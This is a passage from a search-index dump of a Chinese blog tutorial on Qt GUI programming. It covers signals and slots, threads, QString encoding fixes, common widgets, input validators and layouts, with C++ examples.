","date":"2021-10-13","objectID":"/posts/%E7%95%8C%E9%9D%A2%E7%BC%96%E7%A8%8B/qt/:3:3","tags":["Windows"],"title":"Qt","uri":"/posts/%E7%95%8C%E9%9D%A2%E7%BC%96%E7%A8%8B/qt/"},{"categories":["界面编程"],"content":"手动绑定信号槽 新建一个按钮. 添加信号和槽函数. //luoqt.h class luoqt : public QWidget { Q_OBJECT public: luoqt(QWidget *parent = Q_NULLPTR); //信号函数 signals: void TstSignal(); //槽函数 public slots: void TstSlot(); void TstConnect(); private: Ui::luoqtClass ui; }; 使用connect函数进行绑定. //luoqt.cpp luoqt::luoqt(QWidget *parent) : QWidget(parent) { ui.setupUi(this); //使用connect进行绑定 //发送者 信号函数 接收者 槽函数 QObject::connect(ui.btn_connect, SIGNAL(TstSignal()), this, SLOT(TstConnect())); } void luoqt::TstSlot() { printf(\"Hello TstSlot\\n\"); } void luoqt::TstConnect() { printf(\"Hello TstConnect\\n\"); } ","date":"2021-10-13","objectID":"/posts/%E7%95%8C%E9%9D%A2%E7%BC%96%E7%A8%8B/qt/:3:4","tags":["Windows"],"title":"Qt","uri":"/posts/%E7%95%8C%E9%9D%A2%E7%BC%96%E7%A8%8B/qt/"},{"categories":["界面编程"],"content":"QThread 新建一个类,继承QThread,重写run函数即可. #include \u003cQThread\u003e class LuoThread : public QThread { public: void run() { //休眠5s QThread::msleep(5000); } }; //调用,调start,就会自动调用上述的run函数 LuoThread luoThread; luoThread.start(); //或者使用下面这种 (new LuoThread())-\u003estart(); ","date":"2021-10-13","objectID":"/posts/%E7%95%8C%E9%9D%A2%E7%BC%96%E7%A8%8B/qt/:4:0","tags":["Windows"],"title":"Qt","uri":"/posts/%E7%95%8C%E9%9D%A2%E7%BC%96%E7%A8%8B/qt/"},{"categories":["界面编程"],"content":"QWidget 所有用户界面对象的基类. 使用示例: 假设我们要实现的是,程序启动的时候,运行的窗口是我们新建的类所关联的一个窗口,然后5s之后窗口隐藏. 新建一个类,继承QWidget. //LuoQWidget.h #include \u003cQWidget\u003e class LuoQWidget : public QWidget { Q_OBJECT public: LuoQWidget(); ~LuoQWidget(); signals: void LuoHide(); }; //LuoQWidget.cpp LuoQWidget::LuoQWidget() { //手动绑定信号槽 QObject::connect(this, SIGNAL(LuoHide()), this, SLOT(hide())); } LuoQWidget::~LuoQWidget() { } 新建一个类,继承QThread. //LuoThread.h #include \"LuoQWidget.h\" #include \u003cQThread\u003e class LuoThread : public QThread { public: LuoThread(LuoQWidget* pQWidget) { m_pQWidget = pQWidget; } public: void run() { //休眠5s QThread::msleep(5000); //发信号 m_pQWidget-\u003eLuoHide(); } private: LuoQWidget* m_pQWidget; }; main函数中进行调用. //main.cpp #include \u003cQtWidgets/QApplication\u003e #include \"LuoQWidget.h\" #include \"LuoThread.h\" int main(int argc, char *argv[]) { QApplication a(argc, argv); LuoQWidget w; w.setWindowTitle(\"LuoQWidget\"); w.show(); LuoThread luoThread(\u0026w); luoThread.start(); return a.exec(); } 注意 不要在其他线程中直接调用槽函数,否则会崩,我们可以绑定一个信号和槽函数,然后在其他线程中发信号. 相关函数: 获取窗口坐标和尺寸: QRect \u0026QWidget::geometry(); void QWidget::setGeometry(int ax, int ay, int aw, int ah); QWidget w; w.x(); w.y(); w.width(); w.height(); void QWidget::move(int ax, int ay); void QWidget::resize(int w, int h); 窗口状态: void setWindowState(Qt::WindowStates state); //参数如下 enum WindowState { WindowNoState = 0x00000000, WindowMinimized = 0x00000001, WindowMaximized = 0x00000002, WindowFullScreen = 0x00000004, WindowActive = 0x00000008 }; //Qt定义的槽函数 void showMinimized(); void showMaximized(); void showFullScreen(); void showNormal(); 定制窗口: QWidget w; //无边框 w.setWindowFlags(Qt::FramelessWindowHint); //去掉最大最小化按钮 //w.setWindowFlag(Qt::WindowMinimizeButtonHint, false); //w.setWindowFlag(Qt::WindowMaximizeButtonHint, false); //标题栏保留,去除所有按钮 w.setWindowFlags(Qt::WindowTitleHint | Qt::CustomizeWindowHint); w.show(); ","date":"2021-10-13","objectID":"/posts/%E7%95%8C%E9%9D%A2%E7%BC%96%E7%A8%8B/qt/:5:0","tags":["Windows"],"title":"Qt","uri":"/posts/%E7%95%8C%E9%9D%A2%E7%BC%96%E7%A8%8B/qt/"},{"categories":["界面编程"],"content":"QString ","date":"2021-10-13","objectID":"/posts/%E7%95%8C%E9%9D%A2%E7%BC%96%E7%A8%8B/qt/:6:0","tags":["Windows"],"title":"Qt","uri":"/posts/%E7%95%8C%E9%9D%A2%E7%BC%96%E7%A8%8B/qt/"},{"categories":["界面编程"],"content":"使用示例 空判断 QString qstr; if (qstr.isEmpty()) { printf(\"qstr is empty\\n\"); } 字符串拼接 QString qstr1 = \"Luo\"; QString qstr2 = \"Hun\"; qstr1 += qstr2; //qstr1, LuoHun 字符串格式化 QString qstr; qstr = QString(\"name = %1, arg = %2 %3\") .arg(\"Luo\", 2) .arg(56) .arg(10, 0, 16); //qstr, name = Luo, arg = 56 a 单个整型字符串互转 //单个整型转字符串 QString qstrNum = QString::number(5566); //字符串转整型 int num = qstrNum.toInt(); 提取字符串 QString qstr = \"Luo5566,Hun8899\"; QString qstrLeft = qstr.left(5); //qstrLeft, Luo55 QString qstrMid = qstr.mid(2, 6); //qstrMid, o5566, QString qstrRight = qstr.right(5); //qstrRight, n8899 字符串查找 QString qstr = \"Luo5566,Hun8899\"; int n = qstr.indexOf(\"55\"); //n, 3 检查字符串是否以XXX开始或结束 QString qstr = \"Luo5566Hun\"; if (qstr.startsWith(\"luo\", Qt::CaseInsensitive)) { printf(\"startsWith True\\n\"); } if (qstr.endsWith(\"Hun\", Qt::CaseSensitive)) { printf(\"endsWith True\\n\"); } 字符串替换 QString qstr = \"Luo5566,5566Hun8899\"; QString qstr1 = qstr.replace(\"5566\", \"2233\"); //qstr1, Luo2233,2233Hun8899 字符串两端删除空白符 QString qstr = \" Luo5566,Hun8899 \"; QString qstr1 = qstr.trimmed(); //qstr1, Luo5566,Hun8899 分割字符串 QString qstr = \"Luo5566:5566Hun:8899\"; QStringList qLst = qstr.split(\":\"); for (QString str: qLst) { printf(\"%s\\n\", str.toStdString().c_str()); } //Luo5566 //5566Hun //8899 ","date":"2021-10-13","objectID":"/posts/%E7%95%8C%E9%9D%A2%E7%BC%96%E7%A8%8B/qt/:6:1","tags":["Windows"],"title":"Qt","uri":"/posts/%E7%95%8C%E9%9D%A2%E7%BC%96%E7%A8%8B/qt/"},{"categories":["界面编程"],"content":"VS中解决中文乱码 QString内部采用UTF-16编码,构造函数QString::QString(const char *str)默认使用fromUtf8(),将str所指的执行字符集从UTF-8转码成UTF-16. VS默认创建的源码文件格式为GBK. QtCreator默认创建的源码文件格式为UTF-8. 使用QStringLiteral #include \u003cQDebug\u003e #include \u003cQStringLiteral\u003e #include \u003cQMessageBox\u003e int main(int argc, char *argv[]) { QApplication a(argc, argv); QWidget w; QString qstr = QStringLiteral(\"中文\"); qDebug() \u003c\u003c qstr; QMessageBox::information(NULL, \"Luo\", qstr); w.show(); return a.exec(); } 注意 如果源文件本身的格式为UTF-8,再用QStringLiteral这个宏进行转换就会产生乱码. 手动将该源文件格式转换为UTF-8 #include \u003cQDebug\u003e #include \u003cQStringLiteral\u003e #include \u003cQMessageBox\u003e int main(int argc, char *argv[]) { QApplication a(argc, argv); QWidget w; QString qstr = \"中文\"; qDebug() \u003c\u003c qstr; QMessageBox::information(NULL, \"Luo\", qstr); w.show(); return a.exec(); } 使用代码修改源文件字符集为UTF-8 #include \u003cQDebug\u003e #include \u003cQStringLiteral\u003e #include \u003cQMessageBox\u003e #pragma execution_character_set(\"utf-8\") int main(int argc, char *argv[]) { QApplication a(argc, argv); QWidget w; QString qstr = \"中文\"; qDebug() \u003c\u003c qstr; QMessageBox::information(NULL, \"Luo\", qstr); w.show(); return a.exec(); } ","date":"2021-10-13","objectID":"/posts/%E7%95%8C%E9%9D%A2%E7%BC%96%E7%A8%8B/qt/:6:2","tags":["Windows"],"title":"Qt","uri":"/posts/%E7%95%8C%E9%9D%A2%E7%BC%96%E7%A8%8B/qt/"},{"categories":["界面编程"],"content":"编码方式转换 设置本地字符集: #include \u003cQTextCodec\u003e QTextCodec::setCodecForLocale(QTextCodec::codecForName(\"GBK\"));//或UTF-8 GBK-\u003eUTF-8: 通常在VS中使用QString::fromLocal8Bit char* szSrc = \"中文测试\"; //VS本地编码默认为GBK QString qstr = QString::fromLocal8Bit(szSrc); UTF-8-\u003eGBK: 通常在QtCreator中使用QString::fromUtf8 const char* szSrc = \"中文测试\"; //QtCreator本地编码默认为UTF-8 QString qstr = QString::fromUtf8(szSrc); ","date":"2021-10-13","objectID":"/posts/%E7%95%8C%E9%9D%A2%E7%BC%96%E7%A8%8B/qt/:6:3","tags":["Windows"],"title":"Qt","uri":"/posts/%E7%95%8C%E9%9D%A2%E7%BC%96%E7%A8%8B/qt/"},{"categories":["界面编程"],"content":"QString与WinAPI 将QString中存放的中文在WinAPI中使用. char* szSrc = \"中文测试\"; //VS 中使用QString::fromLocal8Bit //QtCreator中使用QString::fromUtf8 QString qstr = QString::fromLocal8Bit(szSrc); ::MessageBoxA(NULL, qstr.toLocal8Bit(), \"MessageBoxA\", MB_OK); ::MessageBoxW(NULL, qstr.toStdWString().c_str(), L\"MessageBoxW\", MB_OK); ","date":"2021-10-13","objectID":"/posts/%E7%95%8C%E9%9D%A2%E7%BC%96%E7%A8%8B/qt/:6:4","tags":["Windows"],"title":"Qt","uri":"/posts/%E7%95%8C%E9%9D%A2%E7%BC%96%E7%A8%8B/qt/"},{"categories":["界面编程"],"content":"QLabel 主要成员函数: void setText(QString); //设置label框内的文本. void hide(); //隐藏label框. void setBuddy(QWidget*); //把另一个部件设为label框的伙伴，方便快捷使用. void clear(); //清空label框内所有内容. void setPixmap(QPixmap(QString)); //设置图片. void setMovie(QMovie*); //设置电影. void setScaledContents(bool); //设置是否按比例填充满整个label框(非常重要) void setToolTip(QString); //设置信息提示,鼠标放在label框上面会自动跳出文字. void setToolTipDuration(int); //设置信息提示的持续时间，单位是毫秒. void setAlignment(Qt::Alignment); //设置label框的对齐格式. void setStyleSheet(QString); //设置label框的样式. 播放Gif动画: QLabel* label = new QLabel(this); label-\u003esetGeometry(0, 0, 400, 400); QMovie* mov = new QMovie(\"tst.gif\"); label-\u003esetMovie(mov); label-\u003eshow(); mov-\u003estart(); 文本格式: 两种格式: PlainText, \\n换行. RichText, 支持html. Url链接: 首先选择RichText. \u003cbr\u003e是换行. QtCreator有点Bug,我目前使用的是5.12.0,要在文本中输入\u003cbr\u003e后双击文本,才可以弹出下面的框 通过上图插入链接,Qt已经定义好了两个信号,然后就可以写槽函数来处理相应的事件了. //鼠标点击url链接信号 void linkActivated(QString); //鼠标滑过url链接信号 void linkHovered(QString)); 属性设置: 通过勾选上述标志,可设置QLabel可选择可编辑等. ","date":"2021-10-13","objectID":"/posts/%E7%95%8C%E9%9D%A2%E7%BC%96%E7%A8%8B/qt/:7:0","tags":["Windows"],"title":"Qt","uri":"/posts/%E7%95%8C%E9%9D%A2%E7%BC%96%E7%A8%8B/qt/"},{"categories":["界面编程"],"content":"QPushButton 事件信号: void QAbstractButton::clicked() void QAbstractButton::clicked(bool checked = false) //是否选中 void QAbstractButton::pressed() void QAbstractButton::released() 设置快捷键: 在英文按钮前加\u0026符号. 这样的话,通过快捷键Alt + P就可以激发click信号了. 使用下述代码 ui.btn_shortCut-\u003esetShortcut(tr(\"Alt+x\")); ui.btn_shortCut-\u003esetShortcut(tr(\"Alt+x,Ctrl+c\")); ","date":"2021-10-13","objectID":"/posts/%E7%95%8C%E9%9D%A2%E7%BC%96%E7%A8%8B/qt/:8:0","tags":["Windows"],"title":"Qt","uri":"/posts/%E7%95%8C%E9%9D%A2%E7%BC%96%E7%A8%8B/qt/"},{"categories":["界面编程"],"content":"QLineEdit 常用函数: void setText(QString); //设置文本,槽函数 不发信号 QString text();//获取文本 void setPlaceholderText(const QString \u0026);//设置提示文字 void setClearButtonEnabled(bool enable);//是否设置一个清空按钮 void setReadOnly(bool); void setMaxLength(int); void setEchoMode(QLineEdit::EchoMode);//设置行编辑框内文本的显示模式 //最常用的模式,分别为:QLineEdit::Normal,QLineEdit::Password.默认为QLineEdit::Normal. void setDragEnabled(bool); //设置行编辑框内的被选择的文本能否被拖拽,默认不能被拖拽 void setAcceptDrops(bool); //设置行编辑框能否被拖拽进来文本. bool isModified(); //判断文本是否被修改. void selectAll(); //选中框内所有文本. QString displayText(); //返回显示的文本. QString selectedText(); //返回被选中的文本. void setInputMask(const QString \u0026inputMask);//格式掩码 void setValidator(QVaildator*); //设置输入验证器 事件信号: void editingFinished();//按下回车,焦点移开 void returnPressed();//格式有效,如setInputMask的参数为\"NNN\",则编辑框内必须输入3个英文字母或者数字,此时按回车,方可激发该信号 void textChanged(const QString \u0026text);//setText()也会激发这个信号 void textEdited(const QString \u0026text); 格式掩码: 假如说编辑框中要设置格式,比如说要指定输入IP地址 ui.Edt_IP-\u003esetInputMask(\"000.000.000.000;_\"); //;后面的_,表示无输入时,填_ 格式校验: 设置有效范围: #include \u003cQIntValidator\u003e #include \u003cQDoubleValidator\u003e //设置只输入整型,设置有效范围为10, 100 QIntValidator* iVal = new QIntValidator(); iVal-\u003esetRange(10, 100); ui.Edt_Int-\u003esetValidator(iVal); //设置只输入浮点,设置有效范围为10, 20,精度为2,即小数点后面有两位 QDoubleValidator* dVal = new QDoubleValidator(0); dVal-\u003esetRange(10, 20, 3); dVal-\u003esetNotation(QDoubleValidator::StandardNotation); ui.Edt_Double-\u003esetValidator(dVal); //验证邮箱 QRegExp exp(\"[a-zA-Z0-9-_]+@[a-zA-Z0-9_]+\\\\.[a-zA-Z]+\"); QRegExpValidator* rVal = new QRegExpValidator(); rVal-\u003esetRegExp(exp); ui.Edt_RegExp-\u003esetValidator(rVal); 注意 上述是设置LineEdit的有效范围,并不是限制输入的范围,如果想要限制输入的范围,我们可以使用QSpinBox、QDoubleSpinBox. ui.spinBox-\u003esetRange(10, 20); ui.doubleSpinBox-\u003esetRange(1.0, 20.0); 校验是否有效: 我们可以设置一个按钮,当编辑框输入内容后,点击按钮来校验. const QValidator* pQValidator = ui.Edt_Int-\u003evalidator(); int pos = 0; int nRet = pQValidator-\u003evalidate(ui.Edt_Int-\u003etext(), pos); if (nRet == QValidator::Acceptable) { qDebug() \u003c\u003c QStringLiteral(\"格式正确\"); } //nRet的返回值有以下三种 //QValidator::Invalid 格式正确 //QValidator::Intermediate 中间输入没结束 //QValidator::Acceptable 格式正确 ","date":"2021-10-13","objectID":"/posts/%E7%95%8C%E9%9D%A2%E7%BC%96%E7%A8%8B/qt/:9:0","tags":["Windows"],"title":"Qt","uri":"/posts/%E7%95%8C%E9%9D%A2%E7%BC%96%E7%A8%8B/qt/"},{"categories":["界面编程"],"content":"Qt布局 遍历QObject子节点: QObjectList cs = this-\u003echildren(); for (int i = 0; i \u003c cs.size(); i++) { //遍历子节点, 获取节点对象名称 qDebug() \u003c\u003c cs[i]-\u003eobjectName(); //遍历子节点, 获取节点对象类型 const QMetaObject* oj = cs[i]-\u003emetaObject(); qDebug() \u003c\u003c oj-\u003eclassName(); } 递归遍历QObject子节点: 可以遍历子节点的子节点. void PrintName(QObject* obj) { if (!obj) //为空直接返回 { return; } printf(\"%s :\", obj-\u003eobjectName().toStdString().c_str()); const QMetaObject* mobj = obj-\u003emetaObject(); //获取元数据 QString cname = mobj-\u003eclassName(); printf(\"%s\\n\", cname.toStdString().c_str()); //对PushButton进行操作 if (cname == \"QPushButton\") { QPushButton* pb = qobject_cast\u003cQPushButton*\u003e(obj); if (pb) { pb-\u003esetText(pb-\u003etext() + \"class\"); } } //递归打印名字 QObjectList cs = obj-\u003echildren(); if (cs.size() \u003c= 0) { return; } for (int i = 0; i \u003c cs.size(); i++) { PrintName(cs[i]); } } QSizePolicy布局尺寸策略分析: 有四种布局: Vertical Layout Horizontal Layout Grid Layout Form Layout SizeHint推荐尺寸: QSize sizeHint() //推荐尺寸,只能重载修改 QSize size() //不包含边框的窗口尺寸 QSizePolicy::PolicyFlag: QSizePolicy::GrowFlag //必要时可超过推荐 QSizePolicy::ExpandFlag //尽可能的拓展 QSizePolicy::ShrinkFlag //必要时可小于推荐 QSizePolicy::IgnoreFlag //缺省大小被忽略 QSizePolicy::Policy: QSizePolicy::Policy QSizePolicy::PolicyFlag Fixed 0 只参考sizeHint() Minimum GrowFlag 伸展和收缩 \u003e= sizeHint() Maximum ShrinkFlag 伸展和收缩 \u003c= sizeHint() Preferred GrowFlag | ShrinkFlag Expanding GrowFlag | ShrinkFlag | ExpandFlag 尽量缩放,最小值为推荐值 MinimumExpanding GrowFlag | ExpandFlag Ignored ShrinkFlag | GrowFlag | IgnoreFlag 忽略推荐大小,尽量缩放 QVBoxlayout,QHBoxLayout: #include \u003cQWidget\u003e #include \u003cQVBoxLayout\u003e #include \u003cQHBoxLayout\u003e #include \u003cQPushButton\u003e int main(int argc, char *argv[]) { QApplication a(argc, argv); //设置全局字体 QFont f(\"Yahei Mono\", 12); a.setFont(f); QWidget* LuoWin = new QWidget; LuoWin-\u003eresize(400, 400); //垂直布局 QVBoxLayout* lay = new QVBoxLayout; //新建一个按钮 QPushButton* btn1 = new QPushButton(\"btn1\"); //设置按钮的尺寸策略, 设置Fixed, 使用推荐尺寸 btn1-\u003esetSizePolicy(QSizePolicy::Expanding, QSizePolicy::Expanding); //设置按钮的最大最小尺寸 btn1-\u003esetMinimumSize(20, 10); btn1-\u003esetMaximumSize(600, 100); QPushButton* btn2 = new QPushButton(\"btn2\"); //布局中添加按钮 lay-\u003eaddWidget(btn1); lay-\u003eaddWidget(btn2); //设置布局的边界, 在LuoWin-\u003eshow()前设置和后面设置是不一样的,在前设置才可以改变btn1-\u003ewidth()的值 lay-\u003esetContentsMargins(0, 0, 0, 0); //设置布局中元素之间的间距,垂直布局,当缩的很小的时候,就可以看到间距了 lay-\u003esetSpacing(10); //添加上述布局 LuoWin-\u003esetLayout(lay); LuoWin-\u003eshow(); //打印推荐尺寸,这个值只有在设置了布局,才可能有效 qDebug() \u003c\u003c \"width:\\t\" \u003c\u003c btn1-\u003esizeHint().width() \u003c\u003c\" height:\" \u003c\u003c btn1-\u003esizeHint().height(); //打印实际尺寸 qDebug() \u003c\u003c \"width:\\t\" \u003c\u003c btn1-\u003ewidth() \u003c\u003c\" height:\" \u003c\u003c btn1-\u003eheight(); return a.exec(); } QGridLayout: #include \u003cQWidget\u003e #include \u003cQSizePolicy\u003e #include \u003cQGridLayout\u003e #include \u003cQPushButton\u003e int main(int argc, char *argv[]) { QApplication a(argc, argv); //设置全局字体 QFont f(\"Yahei Mono\", 12); a.setFont(f); QWidget* LuoWin = new QWidget; LuoWin-\u003eresize(200, 200); QGridLayout* lay = new QGridLayout; QPushButton* btn00 = new QPushButton(\"btn00\"); QPushButton* btn02 = new QPushButton(\"btn02\"); QPushButton* btn12 = new QPushButton(\"btn12\"); QPushButton* btn33 = new QPushButton(\"btn33\"); lay-\u003eaddWidget(btn00, 0, 0); lay-\u003eaddWidget(btn02, 0, 2); lay-\u003eaddWidget(btn12, 1, 2); lay-\u003eaddWidget(btn33, 3, 3); //设置控件之间的间距 //水平间距 lay-\u003esetHorizontalSpacing(20); //垂直间距 lay-\u003esetVerticalSpacing(10); //也可以使用setSpacing同时设置水平和垂直间距 //lay-\u003esetSpacing(10); //设置布局的对齐方式 lay-\u003esetAlignment(Qt::AlignLeft); LuoWin-\u003esetLayout(lay); LuoWin-\u003eshow(); return a.exec(); } QFormLayout: 以下示例,实现遍历FormLayout布局所有元素,并实现空验证和清除. luoqt.h: #pragma once #include \u003cQtWidgets/QWidget\u003e #include \"ui_luoqt.h\" #include \u003cQDebug\u003e #include \u003cQFile\u003e #include \u003cQFormLayout\u003e #include \u003cQPushButton\u003e #include \u003cQLineEdit\u003e #include \u003cQLabel\u003e class luoqt : public QWidget { Q_OBJECT public: luoqt(QWidget *parent = Q_NULLPTR); public slots: //设置皮肤样式 static void SetStyle(const QString\u0026 styleName); void Save(); void Clear(); private: Ui::luoqtClass ui; }; luoqt.cpp: #include \"luoqt.h\" luoqt::luoqt(QWidget *parent) : QWidget(parent) { ui.setupUi(this); //新建一个FormLayout布局 QFormLayout* lay = new Q","date":"2021-10-13","objectID":"/posts/%E7%95%8C%E9%9D%A2%E7%BC%96%E7%A8%8B/qt/:10:0","tags":["Windows"],"title":"Qt","uri":"/posts/%E7%95%8C%E9%9D%A2%E7%BC%96%E7%A8%8B/qt/"},{"categories":["界面编程"],"content":"QCheckBox 默认多选. 常用函数: //文本获取与设置 QString text() const; void setText(const QString \u0026text); //状态获取与设置 bool isChecked() const; void setChecked(bool); //设置自动排他,单选属性 //若同Widget上的两个QCheckBox设置该属性,则每次只能选择其中一个 void setAutoExclusive(bool); 事件信号: void QAbstractButton::clicked(bool checked = false);//按钮点击,就会触发该信号 void QAbstractButton::toggled(bool checked); //状态发生变化,就会触发该信号 ","date":"2021-10-13","objectID":"/posts/%E7%95%8C%E9%9D%A2%E7%BC%96%E7%A8%8B/qt/:11:0","tags":["Windows"],"title":"Qt","uri":"/posts/%E7%95%8C%E9%9D%A2%E7%BC%96%E7%A8%8B/qt/"},{"categories":["界面编程"],"content":"QButtonGroup 将一组按钮放在ButtonGroup上,点击时,可以知道哪个按钮被点击了. 常用信号: void buttonClicked(QAbstractButton *button); void buttonClicked(int id); void buttonPressed(QAbstractButton *button); void buttonPressed(int id); void buttonReleased(QAbstractButton *button); void buttonReleased(int id); void buttonToggled(QAbstractButton *button, bool checked); void buttonToggled(int id, bool checked); 示例: luoqt.h: #include \u003cQCheckBox\u003e #include \u003cQButtonGroup\u003e class luoqt : public QWidget { Q_OBJECT public: luoqt(QWidget *parent = Q_NULLPTR); public slots: void LuoClicked(QAbstractButton* button); void LuoToggled(QAbstractButton* button, bool checked); private: Ui::luoqtClass ui; }; luoqt.cpp: #include \"luoqt.h\" luoqt::luoqt(QWidget *parent) : QWidget(parent) { ui.setupUi(this); QButtonGroup* btnGroup = new QButtonGroup(this); //加组后,默认变为单选 btnGroup-\u003eaddButton(ui.checkBox1); btnGroup-\u003eaddButton(ui.checkBox2); btnGroup-\u003eaddButton(ui.checkBox3); //改为多选 btnGroup-\u003esetExclusive(false); //信号槽绑定 QObject::connect(btnGroup, SIGNAL(buttonClicked(QAbstractButton*)), this, SLOT(LuoClicked(QAbstractButton*))); QObject::connect(btnGroup, SIGNAL(buttonToggled(QAbstractButton* , bool)), this, SLOT(LuoToggled(QAbstractButton*, bool))); } void luoqt::LuoClicked(QAbstractButton* button) { qDebug() \u003c\u003c \"LuoClicked:\" \u003c\u003c button-\u003etext() \u003c\u003c button-\u003eisChecked(); } void luoqt::LuoToggled(QAbstractButton* button, bool checked) { qDebug() \u003c\u003c \"LuoToggled:\" \u003c\u003c button-\u003etext() \u003c\u003c button-\u003eisChecked(); } ","date":"2021-10-13","objectID":"/posts/%E7%95%8C%E9%9D%A2%E7%BC%96%E7%A8%8B/qt/:12:0","tags":["Windows"],"title":"Qt","uri":"/posts/%E7%95%8C%E9%9D%A2%E7%BC%96%E7%A8%8B/qt/"},{"categories":["界面编程"],"content":"QRadioButton 类似QCheckBox, 默认单选 示例: luoqt.h: #include \u003cQMessageBox\u003e #include \u003cQPushButton\u003e #include \u003cQRadioButton\u003e #include \u003cQVBoxLayout\u003e #include \u003cQButtonGroup\u003e class luoqt : public QWidget { Q_OBJECT public: luoqt(QWidget *parent = Q_NULLPTR); public slots: void LuoSave(); private: Ui::luoqtClass ui; }; luoqt.cpp: #include \"luoqt.h\" luoqt::luoqt(QWidget *parent) : QWidget(parent) { ui.setupUi(this); //单选按钮 QRadioButton* btnRadio1 = new QRadioButton(\"btnRadio1\"); QRadioButton* btnRadio2 = new QRadioButton(\"btnRadio2\"); QRadioButton* btnRadio3 = new QRadioButton(\"btnRadio3\"); //按钮组 QButtonGroup* btnGroup = new QButtonGroup(this); btnGroup-\u003esetObjectName(\"btnGroup\");//这里设置ObjectName, 方便下面查找 btnGroup-\u003eaddButton(btnRadio1); btnGroup-\u003eaddButton(btnRadio2); btnGroup-\u003eaddButton(btnRadio3); //垂直布局 QVBoxLayout* layVbox = new QVBoxLayout(this); //遍历QButtonGroup for (int i = 0; i \u003c btnGroup-\u003ebuttons().size(); i++) { layVbox-\u003eaddWidget(btnGroup-\u003ebuttons()[i]); } //保存按钮 QPushButton* btnSave = new QPushButton(\"Save\"); layVbox-\u003eaddWidget(btnSave); QObject::connect(btnSave, SIGNAL(clicked()), this, SLOT(LuoSave())); } void luoqt::LuoSave() { //获取btnGroup QButtonGroup* btnGroup = this-\u003efindChild\u003cQButtonGroup*\u003e(\"btnGroup\"); if (!btnGroup) { return; } //获取被选中的按钮 QRadioButton* btnSelRadio = (QRadioButton*)btnGroup-\u003echeckedButton(); if (!btnSelRadio) { QMessageBox::warning(this, \"\", \"Please checked!\"); } else { QMessageBox::information(this, \"\", btnSelRadio-\u003etext()); } } ","date":"2021-10-13","objectID":"/posts/%E7%95%8C%E9%9D%A2%E7%BC%96%E7%A8%8B/qt/:13:0","tags":["Windows"],"title":"Qt","uri":"/posts/%E7%95%8C%E9%9D%A2%E7%BC%96%E7%A8%8B/qt/"},{"categories":["界面编程"],"content":"QComboBox 常用函数: //新增数据 void addItem(const QString \u0026text, const QVariant \u0026userData = QVariant()); void addItem(const QIcon \u0026icon, const QString \u0026text, const QVariant \u0026userData = QVariant()); void addItems(const QStringList \u0026texts); //插入数据 void insertItem(int index, const QString \u0026text, const QVariant \u0026userData = QVariant()); void insertItem(int index, const QIcon \u0026icon, const QString \u0026text, const QVariant \u0026userData = QVariant()); void insertItems(int index, const QStringList \u0026list); //QVariant 用户自定义数据 //获取当前下标 int currentIndex() const //获取当前文本 QString currentText() const //删除数据 void removeItem(int index); void clearEditText(); //可编辑模式时,清空 void clear(); 事件信号: //用户选中 void activated(int index); void activated(const QString \u0026text); //状态发生变化 void currentIndexChanged(int index); void currentTextChanged(const QString \u0026text); //只读模式没有 void editTextChanged(const QString \u0026text); //选择下拉框,滑过,高亮某行时,就会触发该信号 void highlighted(int index) void highlighted(const QString \u0026text) 示例: luoqt.h: #include \u003cQIcon\u003e #include \u003cQComboBox\u003e class luoqt : public QWidget { Q_OBJECT public: luoqt(QWidget *parent = Q_NULLPTR); public slots: void LuoClick(); private: Ui::luoqtClass ui; }; luoqt.cpp: #include \"luoqt.h\" struct LuoType { int x; int y; }; //使Qt支持此类型 Q_DECLARE_METATYPE(LuoType) luoqt::luoqt(QWidget *parent) : QWidget(parent) { ui.setupUi(this); ui.comboBox-\u003eclear(); //添加用户自定义数据 LuoType luoType; luoType.x = 100; QVariant var; var.setValue(luoType); ui.comboBox-\u003eaddItem(\"001\", var); QIcon icon(\":/luoqt/kenan.png\"); ui.comboBox-\u003eaddItem(icon, \"002\"); ui.comboBox-\u003einsertItem(1, \"003\"); } void luoqt::LuoClick() { //获取当前行下标 qDebug() \u003c\u003c ui.comboBox-\u003ecurrentIndex();; //打印第0行的自定义数据 qDebug() \u003c\u003c ui.comboBox-\u003eitemText(0); QVariant var = ui.comboBox-\u003eitemData(0); qDebug() \u003c\u003c var.value\u003cLuoType\u003e().x; } ","date":"2021-10-13","objectID":"/posts/%E7%95%8C%E9%9D%A2%E7%BC%96%E7%A8%8B/qt/:14:0","tags":["Windows"],"title":"Qt","uri":"/posts/%E7%95%8C%E9%9D%A2%E7%BC%96%E7%A8%8B/qt/"},{"categories":["界面编程"],"content":"QSlider 属性: setRange(int min, int max); //键盘,方向键控制 void setSingleStep(int); //鼠标, 这里通过鼠标点击,并不是点到哪里,就拖动到哪里 void setPageStep(int); //方向 void setOrientation(Qt::Orientation); //Qt::Horizontal //Qt::Vertical 事件信号: void sliderMoved(int value);//拖动 void sliderPressed();//点击滑块 void sliderReleased();//松开滑块 void valueChanged(int value);//点击或者设置 重载鼠标事件: 实现鼠标点击到哪里,滑块就滑动到哪里. 新建一个类LuoSlider,继承QSlider,重载mousePressEvent LuoSlider.h: #include \u003cQSlider\u003e #include \u003cQWidget\u003e #include \u003cQMouseEvent\u003e #include \u003cQDebug\u003e class LuoSlider : public QSlider { public: LuoSlider(QWidget* p = NULL); ~LuoSlider(); public: virtual void mousePressEvent(QMouseEvent* e); }; LuoSlider.cpp: #include \"LuoSlider.h\" LuoSlider::LuoSlider(QWidget* p /*= NULL*/):QSlider(p) { } LuoSlider::~LuoSlider() { } void LuoSlider::mousePressEvent(QMouseEvent* e) { double dbl = (double)e-\u003epos().x() / (double)width(); int nVal = dbl * (maximum() - minimum()) + minimum(); setValue(nVal); QSlider::mousePressEvent(e); qDebug() \u003c\u003c e-\u003epos().x(); } 将新建的类LuoSlider与界面上的QSlider关联 ","date":"2021-10-13","objectID":"/posts/%E7%95%8C%E9%9D%A2%E7%BC%96%E7%A8%8B/qt/:15:0","tags":["Windows"],"title":"Qt","uri":"/posts/%E7%95%8C%E9%9D%A2%E7%BC%96%E7%A8%8B/qt/"},{"categories":["界面编程"],"content":"QListWidget 属性: //单选,多选 QAbstractItemView::SelectionMode selectionMode() const; void setSelectionMode(QAbstractItemView::SelectionMode mode); enum SelectionMode { NoSelection, SingleSelection, //单选 MultiSelection, //多选 ExtendedSelection, //Ctrl + 鼠标 多选, Shift + 鼠标 连续选 ContiguousSelection //Ctrl + 鼠标 以及 Shift + 鼠标 都是连续选 }; //从上到下或从左到右排列 flow //每一行的行高 gridSize //图标的宽高 iconSize 常用函数: //新增数据 void addItem(const QString \u0026label); void addItem(QListWidgetItem *item); void addItems(const QStringList \u0026labels); //添加数据 void insertItem(int row, QListWidgetItem *item); void insertItem(int row, const QString \u0026label); void 